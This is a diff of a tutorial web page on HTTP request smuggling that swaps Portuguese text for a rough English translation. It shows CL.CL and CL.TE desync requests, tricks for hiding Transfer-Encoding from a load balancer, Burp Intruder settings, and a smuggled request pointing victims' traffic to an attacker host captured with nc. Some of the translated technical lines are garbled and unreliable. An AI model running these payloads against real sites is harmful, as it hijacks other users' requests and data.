@@ -57,47 +57,47 @@
         <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">HTTP Smuggling</h1>
         <p style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">Author: @sniss</p>
         <div>
-                <pre style="color:white;">    ((((( Introdução )))))
+                <pre style="color:white;">    ((((( Introduction )))))
 
 
-    - Está vulnerabilidade ocorre com sites que usam um load balancer ou reverse proxy
+    - This vulnerability occurs with sites that use a load balancer or reverse proxy.
     
     
     
-    - Load balancer distribui as cargas  de processamento de um site em varios servidores
+    - Load balancer distributes a website's processing loads across multiple servers
     
     
-    - Um servidor proxy reverso é um tipo de servidor proxy que normalmente fica atrás do firewall em uma rede privada 
-    e direciona as solicitações do cliente para o servidor de back-end apropriado. 
-    Eles também podem executar tarefas adicionais, como criptografia SSL, 
-    para aliviar a carga de seus servidores da Web, aumentando assim seu desempenho. 
+    - A reverse proxy server is a type of proxy server that usually sits behind the firewall on a private network
+     and directs client requests to the appropriate backend server.
+     They can also perform additional tasks such as SSL encryption,
+     to lighten the load on your web servers, thus increasing their performance.
     
     
     
-    ((( Como funciona a conexão entre o  LB e os outros servidores)))
+    (((How the connection between LB and the other servers works)))
     
     
     USER ----> google.com
                         |
-                        -----> LB ----------------------> webapp01 (Servidor de Back-End)
+                        -----> LB ----------------------> webapp01 (Back-End Server)
                                         TCP/TLS
                                     HTTP Connection Reuse
                                     ou keep-alive
     
     
     
-        - O HTTP Connection Reuse ou keep-alive  é utilizado  para não ficar toda hora que precisar de um pacote ficar
-        abrindo novas conexões , assim melhorando o desempenho da aplicação  ou seja ele mantém a conexão entre o usuario eo
-        load balancer eo lb eo back end aberto, 
+        - The HTTP Connection Reuse or keep-alive is used to not stay every time a packet needs to stay
+         opening new connections , thus improving the performance of the application ie it maintains the connection between the user and the
+         load balancer and lb and open back end,
         
     
     
     
-                            ((((( Desync  Com CL.CL)))))
+                            ((((( Desync with CL.CL)))))
     
         
-        - Em alguns casos quando o LB controla o Connection Reuse eo keep-alive, ele pode 
-        aproveitar a mesma requisição para usuários diferentes ou seja em mesmas requisições processar o pedido dos dois usuários:
+        - In some cases when LB handles Connection Reuse and keep-alive, it may
+         take advantage of the same request for different users, that is, in the same requests, process the request of the two users:
     
     
         User1----->            Req:User2    Req: User1
@@ -108,9 +108,9 @@
     
     
     
-    - Existe um problema quando isso acontece quando o LB mantém a conexão aberta para usuários diferentes o problema é se O
-    usuário enviar um conteúdo a mais do que ele precisa, esse conteúdo a mais iria fazer parte da requisição do outro usuário,esse 
-    ataque chamamos de desync porque conseguimos dessincronizar o LB e o back-end
+    - There is a problem when this happens when LB keeps the connection open for different users the problem is if O
+     user sends more content than he needs, this extra content would be part of the other user's request, this
+     attack we call desync because we managed to desynchronize LB and backend
     
     
     
@@ -121,33 +121,33 @@
     POST /home HTTP/1.1                                       POST /home HTTP/1.1 
     Host: localhost                                           Host: localhost
     Content-Length: 55(lb)                                    Content-Length: 55(lb)
-    Content-Length: 13(back-end (só  conta nome=carlos))      Content-Length: 13(back-end)
+    Content-Length: 13(back-end (only counts name=carlos))      Content-Length: 13(back-end)
     Content-Type: application/-www-form-urlencoded            Content-Type: application/-www-form-urlencoded
     
     
-    nome=carlos                                               nome=carlos
+    name=carlos                                               name=carlos
                                                                     
-    GET /admin HTTP/1.1                                      --------------Interpreta como outra request---------------
+    GET /admin HTTP/1.1                                      --------------Interprets as another request---------------
     HOST:localhost                                                
                                                                             GET /admin HTTP/1.1
                                                                             HOST:localhost
     
     
     
-    OBS:(A cada final de linha existe 2 caracteres invisíveis o \t e o \n)
+    Note: At each end of the line there are 2 invisible characters \t and \n
     
     
-    - Este tipo de Desync não é muito comum atualmente pois a maioria dos sistemas ignoram dois headers repetidos
-    
-    
-    
-    
-                                ((((((((Desync com Transfer-Encoding))))))))
+    - This type of Desync is not very common nowadays as most systems ignore two repeated headers
     
     
     
-    - Se uma requisição receber Transfer-Encoding e Content-Length, o Transfer-Encoding ele tem que ignorar o Content-Length
-    e priorizar o Transfer-Encoding
+    
+                                ((((((((Desync with Transfer-Encoding))))))))
+    
+    
+    
+    - If a request receives Transfer-Encoding and Content-Length, the Transfer-Encoding it has to ignore the Content-Length
+     and prioritize Transfer-Encoding
     
     
                                 EX:
@@ -156,64 +156,64 @@
     POST /home HTTP/1.1                                       POST /home HTTP/1.1 
     Host: localhost                                           Host: localhost
     Content-Length: 6(lb)                                    Content-Length: 6(lb)
-    Transfer-Encoding: chunked(ignorado)                     Transfer-Encoding: chunked (ele implemento a regra ou seja o 
-                                                                Content-Length foi ignorado)
+    Transfer-Encoding: chunked(ignored)                     Transfer-Encoding: chunked (he implements the rule i.e. the
+                                                                                        Content-Length was ignored)
                 
     
     0                                                            0
     
     
-    T                                                           --------- Outra request ------------  
+    T                                                           --------- Other request ------------  
                                                                     T
     
     
-    - o chunked serve para enviar as requisições divididas
+    - chunked is used to send split requests
     
     
-    - 0 indica o tamanho da parte que está enviando ou seja ele serve como um Content-Length  (temos que botar esse número em hexa
-    decimal, porém não precisamos botar o numero antes do x e nem o x)
+    - 0 indicates the size of the part being sent, that is, it serves as a Content-Length (we have to put this number in hex
+     decimal, but we don't need to put the number before the x and neither the x)
     
     
-    - Em alguns cenários podemos fazer o LB ignorar o  Transfer-Encoding para passar para o back-end, esses cenários são:
+    - In some scenarios we can make LB ignore the Transfer-Encoding to pass to the backend, these scenarios are:
         
-            colocar um espaço antes do Transfer-Encoding,
-            
-            colocar um caractere especial(/t) substituindo o espaço entre o ":" e o chunked para fazer isso selecione o espaço
-            e aperte tab
-            
-            colocar um /t invertido em hexadecimal, para fazer isso vamos para o repeater aperte na opção hex e procure o espaço,
-            e troque o hex do espaço por 0b
-    
-    
-    
-    OBS:(Se o ataque não estiver funcionando mande-o para o intruder, aperte no clean, na opção Payloads sete como Null Payloads
-    e marque a opção Continue Indefinitely, na opção Options desmarque o Update Content-Length e o Connection Close)
-    
-        
-    
-    
-    
-                                (((( Exploração  Http Smuggling + Host Header Injection))))
+                put a space before the Transfer-Encoding,
                         
-    - depois de encontrada a vulnerabilidade vamos tentar manipular a requisição da vítima
+                put a special character (/t) replacing the space between the ":" and the chunked to do this select the space
+                and press tab
+            
+                put an inverted /t in hexadecimal, to do this we go to the repeater press the hex option and look for the space,
+                and change the space hex to 0b
     
-    - Vamos enviar em vez do T uma requisição:
+    
+    
+            Note: If the attack is not working, send it to the intruder, press clean, in the option Payloads seven as Null Payloads
+            and check the Continue Indefinitely option, in the Options option uncheck Update Content-Length and Connection Close
+    
+        
+    
+    
+    
+                                (((( Http Smuggling Exploitation + Host Header Injection))))
+                        
+    - after finding the vulnerability we will try to manipulate the victim's request
+   
+    - Let's send a request instead of the T:
     
                     0
     
                 GET / HTTP/1.1
-                HOST:seuip/
+                HOST:yourip/
                 X-test:
     
-    - Ou seja podemos manipular onde o usuário vai fazer a requisição e o'que ele vai requisitar
-    
-    - A '/' serve para o back-end ignorar o 2 host header
-    
-    
-    - Para conseguirmos ver uma requisição de um usuário vamos subir um nc no nosso ip e rodar o intruder com nosso exploit
+    - That is, we can manipulate where the user will make the request and what he will request
+
+    - A '/' is for the backend to ignore the header of 2 hosts
     
     
-    - Agora conseguirmos ver as requisições dos usuários                    
+    - In order to be able to see a request from a user, we will upload an nc to our ip and run the intruder with our exploit
+    
+    
+    - Now we can see user requests                
                 </pre>                    
         </div>
     </body>
